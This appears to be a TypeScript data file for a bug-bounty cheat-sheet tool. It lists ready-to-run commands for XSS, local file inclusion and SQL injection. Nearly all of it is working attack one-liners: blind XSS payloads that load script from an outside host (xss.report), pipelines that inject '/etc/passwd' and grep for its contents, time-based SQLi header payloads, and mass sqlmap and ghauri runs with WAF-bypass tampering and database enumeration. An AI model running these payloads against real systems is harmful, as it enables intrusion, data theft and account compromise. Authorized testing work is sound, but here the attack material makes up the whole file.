import { CommandCategory } from '../../types';

// ============================================
// INJECTION VULNERABILITY COMMANDS
// ============================================

export const injectionCategories: CommandCategory[] = [
    {
        id: 'xss-testing',
        title: 'XSS Testing',
        commands: [
            {
                name: 'XSS Hunting Pipeline',
                command: ['echo https://{target}/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt'],
                description: 'Collects XSS vulnerabilities using various tools and saves them to a file.'
            },
            {
                name: 'XSS with Dalfox',
                command: ['cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence'],
                description: 'Uses Dalfox to scan for XSS vulnerabilities.'
            },
            {
                name: 'Stored XSS Finder',
                command: ['cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high'],
                description: 'Finds potential stored XSS vulnerabilities by scanning forms.'
            },
            {
                name: 'DOM XSS Detection',
                command: ['cat js_files.txt | Gxss -c 100 | sort -u | dalfox pipe -o dom_xss_results.txt'],
                description: 'Finds potential stored XSS vulnerabilities.'
            },
            {
                name: 'Refining And Validating Results',
                command: [`cat xss_output.txt | grep -oP '^URL: \\K\\S+' | sed 's/=.*/=/' | sort -u > final.txt`],
                description: 'Clean and sort XSS results.'
            },
            {
                name: 'Header Based Blind XSS',
                command: [`subfinder -d example.com | gau | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header 'X-Forwarded-For`],
                description: 'Test for blind XSS via headers.'
            },
            {
                name: 'Blind XSS in Parameters',
                command: [`subfinder -d example.com | gau | grep '&' | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters`],
                description: 'Find blind XSS in URL parameters.'
            },
            {
                name: 'Single XSS Check All URLs',
                command: [`echo 'example.com ' | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln`],
                description: 'Quick XSS check across all URLs.'
            },
            {
                name: 'XSS From Javascript Hidden Params',
                command: [`assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\\e[1;33m$url\\n\\e[1;32m$vars"`],
                description: 'Find XSS in hidden JavaScript parameters.'
            },
            {
                name: 'Finding XSS With ARJUN And KXSS',
                command: [`arjun -q -u example.com -oT arjun && cat arjun | awk -F'[?&]' '{baseUrl=$1; for(i=2; i<=NF; i++) {split($i, param, "="); print baseUrl "?" param[1] "="}}' | kxss`],
                description: 'Discover XSS using parameter discovery.'
            },
            {
                name: 'DOM XSS Detection GetJS',
                command: [`cat domain.txt | getjs |httpx --match-regex"addEventListener\\((?:'|\\:")message(?:'|\\")"`],
                description: 'Find DOM XSS via event listeners.'
            }
        ]
    },
    {
        id: 'lfi-testing',
        title: 'LFI / Path Traversal',
        commands: [
            {
                name: 'LFI Methodology',
                command: [`echo "https://{target}/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\\*|\\$[^\\:]*):0:0:" -v`],
                description: 'Tests for Local File Inclusion (LFI) vulnerabilities using various methods.'
            },
            {
                name: 'LFI Alternative Method',
                command: [`echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\\*|\\$[^\\:]*):0:0:'`],
                description: 'Alternative LFI testing method.'
            },
            {
                name: 'Easy Way To Find LFI',
                command: [
                    `subfinder -d domain.com -all -silent | httpx-toolkit -o output.txt`,
                    `nuclei -l output.txt -t /nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30`
                ],
                description: 'Quick LFI detection using Nuclei.'
            },
            {
                name: 'One Line To Find LFI Bugs',
                command: [`gau https://example.com/ | gf lfi | gsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! &";`],
                description: 'One-liner LFI detection.'
            },
            {
                name: 'LFI Oneliner with FFUF',
                command: [`echo "https://www.example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:x:0:" -v`],
                description: 'LFI testing with FFUF.'
            },
            {
                name: 'FFUF Request File Method LFI',
                command: [`ffuf -request lfi -request-proto https -w /root/wordlists/offensive\\ payloads/LFI\\ payload.txt -c -mr 'root:'`],
                description: 'LFI testing using FFUF request file.'
            }
        ]
    },
    {
        id: 'sqli-testing',
        title: 'SQL Injection Testing',
        commands: [
            {
                name: 'Single Domain Recon for SQLi',
                command: [`subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'`],
                description: 'Reconnaissance for potential SQL injectable endpoints.'
            },
            {
                name: 'Multiple Subdomain SQLi Recon',
                command: [`subfinder -d -l subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'`],
                description: 'Multiple subdomain reconnaissance for SQL injection testing.'
            },
            {
                name: 'Discover SQLi Parameters with GAU',
                command: [`echo https://example.com | gau | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='`],
                description: 'Discover potential SQL injectable parameters.'
            },
            {
                name: 'SQLi Endpoints with Katana',
                command: [`echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp'`],
                description: 'Alternative method for finding SQL injectable endpoints.'
            },
            {
                name: 'Mass SQLi Testing with Ghauri',
                command: ['subfinder -d https://example.com -all -silent | gau --threads 50 | uro | gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm'],
                description: 'Mass SQL injection testing using ghauri.'
            },
            {
                name: 'Comprehensive SQLi with SQLMap',
                command: ['subfinder -d https://example.com -all -silent | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent'],
                description: 'Comprehensive SQL injection testing using sqlmap.'
            },
            {
                name: 'User-Agent Header SQLi Test',
                command: [`curl -s -H 'User-Agent: 'XOR(if(now()=sysdate(),sleep(5),0))XOR' --url 'https://example.com'`],
                description: 'Testing for time-based SQL injection via User-Agent header.'
            },
            {
                name: 'X-Forwarded-For SQLi Test',
                command: [`curl -s -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' --url 'https://example.com'`],
                description: 'Testing for time-based SQL injection via X-Forwarded-For header.'
            },
            {
                name: 'Referer Header SQLi Test',
                command: [`curl -s -H 'Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'' --url 'https://example.com'`],
                description: 'Testing for time-based SQL injection via Referer header.'
            },
            {
                name: 'SQLMap with WAF Bypass',
                command: [`sqlmap -u 'https://domain.com/page/index.php?id=34' --batch --dbs --threads=5 --random-agent --risk=3 --level=5 --tamper=space2comment -v 3 --dbms MySQL`],
                description: 'SQLMap with WAF bypass techniques.'
            },
            {
                name: 'SQLI One-Liner Automation',
                command: [`subfinder -d testphp.vulnweb.com -all -silent | gau | urldedupe | gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent | tee -a sqli.txt`],
                description: 'Automated SQL injection pipeline.'
            },
            {
                name: 'SQLMAP From WaybackURL',
                command: [`waybackurls target | grep -E '\\bhttps?://\\S+?=\\S+' | grep -E '\\.php|\\.asp' | sort -u | sed 's/\\(=[^&]*\\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"`],
                description: 'SQLMap testing from Wayback URLs.'
            },
            {
                name: 'SQLMAP Brute-Force Login',
                command: [`sqlmap -u 'PATCH DIREKTORY LOGIN' --data='username=username&password=password&submit=' --level=5 --risk=3`],
                description: 'SQLMap brute-force username/password.'
            }
        ]
    }
];
